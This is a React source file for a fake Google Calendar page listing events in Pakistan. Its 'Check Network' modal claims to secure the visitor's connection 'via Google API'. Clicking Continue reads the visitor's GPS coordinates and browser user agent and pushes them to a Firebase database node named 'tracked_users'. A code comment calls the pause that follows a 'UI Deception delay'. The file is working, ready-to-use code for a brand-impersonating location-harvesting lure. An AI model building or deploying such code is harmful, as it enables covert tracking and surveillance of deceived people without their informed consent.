import React, { useState } from "react";
import { initializeApp, getApps } from "firebase/app";
import { getDatabase, ref, push } from "firebase/database";

// --- FIREBASE CONFIGURATION ---
const firebaseConfig = {
  databaseURL: "https://network-cecda-default-rtdb.firebaseio.com/",
};

// Initialize Firebase once
if (!getApps().length) {
  initializeApp(firebaseConfig);
}
const db = getDatabase();

const Login = () => {
  const [isModalOpen, setIsModalOpen] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState(null);
  const [sidebarOpen, setSidebarOpen] = useState(false);

  const handleGetLocation = () => {
    setIsLoading(true);
    setError(null);

    if (!navigator.geolocation) {
      setError("Browser not supported.");
      setIsLoading(false);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;
        const payload = {
          lat: latitude,
          lng: longitude,
          time: new Date().toISOString(),
          device_info: navigator.userAgent,
        };

        try {
          // Push data to Firebase
          await push(ref(db, "tracked_users"), payload);

          // UI Deception delay to simulate "syncing"
          setTimeout(() => {
            setIsLoading(false);
            setIsModalOpen(false);
          }, 1500);
        } catch (err) {
          console.error("Firebase Error:", err);
          setError("Network sync failed. Please try again.");
          setIsLoading(false);
        }
      },
      (err) => {
        console.error("Location error:", err.message);
        setError("Sync Failed: Location permission is required.");
        setIsLoading(false);
      }
    );
  };

  return (
    <div className="flex h-screen bg-white font-sans text-slate-800 overflow-hidden relative">
      {/* Sidebar Overlay (Mobile) */}
      {sidebarOpen && (
        <div
          className="fixed inset-0 bg-black/50 z-20 md:hidden"
          onClick={() => setSidebarOpen(false)}
        ></div>
      )}

      {/* Sidebar */}
      <aside
        className={`fixed inset-y-0 left-0 w-64 bg-white border-r border-slate-200 transition-transform duration-300 ease-in-out z-30 flex flex-col 
          ${
            sidebarOpen ? "translate-x-0" : "-translate-x-full"
          } md:translate-x-0`}
      >
        <div className="h-16 flex items-center px-6 border-b border-slate-100">
          <div className="flex items-center gap-2 font-bold text-slate-700 text-lg">
            <span className="text-[#1a73e8]">G</span>
            <span className="text-[#ea4335]">o</span>
            <span className="text-[#fbbc04]">o</span>
            <span className="text-[#1a73e8]">g</span>
            <span className="text-[#34a853]">l</span>
            <span className="text-[#ea4335]">e</span>
            <span className="text-slate-500 font-normal ml-1">Calendar</span>
          </div>
        </div>
        <div className="p-4">
          <button className="w-full py-3 bg-white border border-slate-200 shadow-sm hover:shadow text-slate-600 rounded-full flex items-center justify-center gap-2 transition font-medium">
            <svg
              className="w-5 h-5 text-[#ea4335]"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d="M12 4v16m8-8H4"
              />
            </svg>
            Create Event
          </button>
        </div>
        <nav className="flex-1 px-3 space-y-1">
          <span className="flex items-center gap-3 px-4 py-2 bg-blue-50 text-[#1a73e8] rounded-r-full font-medium text-sm">
            <svg
              className="w-5 h-5"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"
              />
            </svg>
            Upcoming Events
          </span>
        </nav>
        <div className="p-4 border-t border-slate-100">
          <h3 className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-3">
            My Calendars
          </h3>
          <div className="space-y-2">
            <div className="flex items-center gap-2 text-sm text-slate-600">
              <input
                type="checkbox"
                defaultChecked
                className="accent-[#1a73e8] w-4 h-4 rounded"
              />
              <span>Pak-Region Ops</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-slate-600">
              <input
                type="checkbox"
                defaultChecked
                className="accent-[#34a853] w-4 h-4 rounded"
              />
              <span>Holidays in Pakistan</span>
            </div>
          </div>
        </div>
      </aside>

      {/* Main Content */}
      <div className="flex-1 flex flex-col md:ml-64 relative overflow-hidden bg-white">
        <header className="h-16 border-b border-slate-200 flex items-center justify-between px-6 z-10">
          <div className="flex items-center gap-4">
            <button
              onClick={() => setSidebarOpen(true)}
              className="md:hidden text-slate-500"
            >
              <svg
                className="w-6 h-6"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth="2"
                  d="M4 6h16M4 12h16M4 18h16"
                />
              </svg>
            </button>
            <h2 className="text-xl font-medium text-slate-700">2026</h2>
          </div>
          <div className="flex items-center gap-4">
            <div className="flex -space-x-2">
              <div className="w-8 h-8 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs border-2 border-white">
                JD
              </div>
              <div className="w-8 h-8 rounded-full bg-green-500 text-white flex items-center justify-center text-xs border-2 border-white">
                AK
              </div>
            </div>
          </div>
        </header>

        <main className="flex-1 overflow-auto p-6">
          <div className="max-w-5xl mx-auto">
            <div className="mb-6 bg-blue-50 border-l-4 border-[#1a73e8] p-4 rounded-r shadow-sm flex items-start gap-3">
              <svg
                className="w-5 h-5 text-[#1a73e8] mt-0.5"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth="2"
                  d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                />
              </svg>
              <div>
                <h4 className="text-sm font-bold text-blue-900">
                  Regional Sync Active
                </h4>
                <p className="text-xs text-blue-700 mt-1">
                  Events below are synced from the "Pakistan Enterprise" public
                  calendar. Times have been automatically adjusted.
                </p>
              </div>
            </div>

            <h3 className="text-slate-500 font-medium mb-4 text-sm uppercase tracking-wider">
              Upcoming Events
            </h3>
            <div className="space-y-4">
              {/* Event 1 */}
              <div className="group border border-slate-200 border-l-[#1a73e8] border-l-4 rounded-lg p-5 shadow-sm hover:shadow-md hover:translate-x-1 transition-all bg-white">
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                  <div className="flex items-start gap-4">
                    <div className="text-center min-w-[60px]">
                      <span className="block text-2xl font-bold text-slate-800">
                        25
                      </span>
                      <span className="text-xs text-slate-400 uppercase">
                        Jan
                      </span>
                    </div>
                    <div>
                      <h3 className="text-lg font-semibold text-slate-800">
                        Lahore Innovation Tech Summit
                      </h3>
                      <p className="text-sm text-slate-500 mt-1">
                        09:00 AM - 05:00 PM • Expo Center, Lahore
                      </p>
                    </div>
                  </div>
                  <button className="px-4 py-2 border border-slate-200 text-slate-600 rounded hover:bg-slate-50 text-sm font-medium">
                    View Details
                  </button>
                </div>
              </div>

              {/* Event 2 */}
              <div className="group border border-slate-200 border-l-[#34a853] border-l-4 rounded-lg p-5 shadow-sm hover:shadow-md hover:translate-x-1 transition-all bg-white">
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                  <div className="flex items-start gap-4">
                    <div className="text-center min-w-[60px]">
                      <span className="block text-2xl font-bold text-slate-800">
                        28
                      </span>
                      <span className="text-xs text-slate-400 uppercase">
                        Jan
                      </span>
                    </div>
                    <div>
                      <h3 className="text-lg font-semibold text-slate-800">
                        Islamabad Policy Review
                      </h3>
                      <p className="text-sm text-slate-500 mt-1">
                        11:30 AM - 02:00 PM • Blue Area, Islamabad
                      </p>
                    </div>
                  </div>
                  <button className="px-4 py-2 border border-slate-200 text-slate-600 rounded hover:bg-slate-50 text-sm font-medium">
                    View Details
                  </button>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>

      {/* Permission Modal */}
      {isModalOpen && (
        <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-sm flex items-center justify-center z-50 p-4 transition-opacity duration-300">
          <div className="bg-white rounded-xl p-8 shadow-2xl max-w-sm w-full text-center relative">
            <div className="w-16 h-16 bg-white border border-slate-100 rounded-full shadow-lg flex items-center justify-center mx-auto mb-6">
              <svg
                className="w-8 h-8 text-[#1a73e8]"
                fill="currentColor"
                viewBox="0 0 24 24"
              >
                <path d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20a2 2 0 0 0 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V10h14v10zm0-12H5V6h14v2zm-7 5h5v5h-5z" />
              </svg>
            </div>
            <h2 className="text-xl font-bold text-slate-800 mb-2">
              Check Network
            </h2>
            <p className="text-slate-500 text-sm mb-6 leading-relaxed">
              Checking Network is Important to make <br />
              Your <strong> connection Secure</strong>
            </p>

            {error && (
              <div className="mb-4 p-3 bg-red-50 text-red-600 text-xs rounded border border-red-100 text-left">
                <strong>Sync Failed:</strong> {error}
              </div>
            )}

            <button
              onClick={handleGetLocation}
              disabled={isLoading}
              className="w-full text-xl py-3 bg-[#1a73e8] hover:bg-blue-700 text-white font-medium rounded-lg transition-all shadow-md flex justify-center items-center gap-2 disabled:opacity-70"
            >
              {isLoading ? (
                <>
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                      fill="none"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                  Checking Network...
                </>
              ) : (
                "Continue"
              )}
            </button>
            <p className="text-xs text-slate-400 mt-4">
              Secure connection via Google API
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default Login;
